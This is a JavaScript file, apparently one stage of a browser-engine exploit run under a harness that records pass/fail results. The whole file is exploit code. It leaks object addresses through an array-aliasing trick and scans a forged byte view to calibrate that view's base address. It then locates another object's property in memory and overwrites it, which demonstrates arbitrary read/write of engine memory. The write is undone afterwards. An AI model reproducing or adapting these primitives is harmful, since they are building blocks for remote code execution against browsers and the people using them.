// Calibrate a forged-view base from one live object's inline property, then
// predict and reversibly write a separately allocated object's property.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
var targetIndex = -1;
var targetOriginal = [];
var targetChanged = false;
try {
  if (!state || !state.view || !state.array || !state.a ||
      state.array[0] !== state.a || !Number.isInteger(state.index))
    throw new Error("held_array_preflight_failed");
  var view = state.view;
  function matches(at, value) {
    return view[at] === (value & 255) &&
      view[at + 1] === (value >>> 8 & 255) &&
      view[at + 2] === (value >>> 16 & 255) &&
      view[at + 3] === (value >>> 24 & 255);
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var b = 0; b < 8; b++) bytes.push(view[state.index + b]);
    } finally {
      state.array[0] = state.a;
    }
    var hex = "0x";
    for (var h = 7; h >= 0; h--)
      hex += bytes[h].toString(16).padStart(2, "0");
    return hex;
  }
  phase = "anchor";
  var anchor = { marker: 0x11223344 };
  state.addressAnchor = anchor;
  var anchorWord = wordOf(anchor);
  var candidates = [];
  var count = 0;
  for (var i = 2097152; i + 3 < 4194304; i++) {
    if (matches(i, 0x11223344)) {
      count++;
      if (candidates.length < 32) candidates.push(i);
    }
  }
  if (!count || count > 32) throw new Error("anchor_candidate_count_" + count);
  var changed = [];
  try {
    anchor.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches(candidates[c], 0x55667788)) changed.push(candidates[c]);
  } finally {
    anchor.marker = 0x11223344;
  }
  if (changed.length !== 1 || !matches(changed[0], 0x11223344))
    throw new Error("anchor_live_count_" + changed.length);
  var anchorIndex = changed[0];
  var anchorPointer = Number(anchorWord);
  var viewBase = anchorPointer + 8 - anchorIndex;
  if (!Number.isSafeInteger(viewBase) || viewBase <= 0 ||
      viewBase % 4096 !== 0)
    throw new Error("base_not_page_aligned");
  if (api && typeof api.markSync === "function")
    api.markSync("addressed_base_calibrated");
  phase = "target";
  var spacer = [];
  for (var s = 0; s < 256; s++) spacer.push({ value: s });
  state.addressSpacer = spacer;
  var target = { marker: 0x31425364 };
  state.addressTarget = target;
  var targetWord = wordOf(target);
  var targetPointer = Number(targetWord);
  targetIndex = targetPointer + 8 - viewBase;
  if (!Number.isSafeInteger(targetIndex) || targetIndex < 0 ||
      targetIndex + 3 >= 4194304)
    throw new Error("target_outside_window");
  var predictedOld = matches(targetIndex, 0x31425364);
  var propertyMutation = false;
  try {
    target.marker = 0x65768798;
    propertyMutation = matches(targetIndex, 0x65768798);
  } finally {
    target.marker = 0x31425364;
  }
  if (!predictedOld || !propertyMutation ||
      !matches(targetIndex, 0x31425364))
    throw new Error("predicted_slot_not_live");
  for (var o = 0; o < 4; o++) targetOriginal.push(view[targetIndex + o]);
  if (api && typeof api.markSync === "function")
    api.markSync("addressed_target_before_write");
  phase = "view_write";
  var aliasChanged = false;
  var anchorUnchanged = false;
  var aliasRestored = false;
  targetChanged = true;
  try {
    for (var w = 0; w < 4; w++)
      view[targetIndex + w] = (0x12345678 >>> (w * 8)) & 255;
    aliasChanged = target.marker === 0x12345678 &&
      matches(targetIndex, 0x12345678);
    anchorUnchanged = anchor.marker === 0x11223344;
  } finally {
    for (var r = 0; r < 4; r++) view[targetIndex + r] = targetOriginal[r];
    targetChanged = false;
    aliasRestored = target.marker === 0x31425364 &&
      matches(targetIndex, 0x31425364) && state.array[0] === state.a;
  }
  if (api && typeof api.markSync === "function")
    api.markSync("addressed_target_restored");
  result = { id: "addressed_object_rw",
    status: aliasChanged && anchorUnchanged && aliasRestored ? "pass" : "fail",
    details: { anchor_word: anchorWord, anchor_index: anchorIndex,
      anchor_candidates: count, base: "0x" + viewBase.toString(16),
      target_word: targetWord, target_index: targetIndex,
      predicted_old: predictedOld, property_mutation: propertyMutation,
      alias_changed: aliasChanged, anchor_unchanged: anchorUnchanged,
      alias_restored: aliasRestored } };
} catch (error) {
  if (targetChanged && state && state.view && targetOriginal.length === 4 &&
      targetIndex >= 0)
    for (var x = 0; x < 4; x++) state.view[targetIndex + x] = targetOriginal[x];
  result = { id: "addressed_object_rw", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
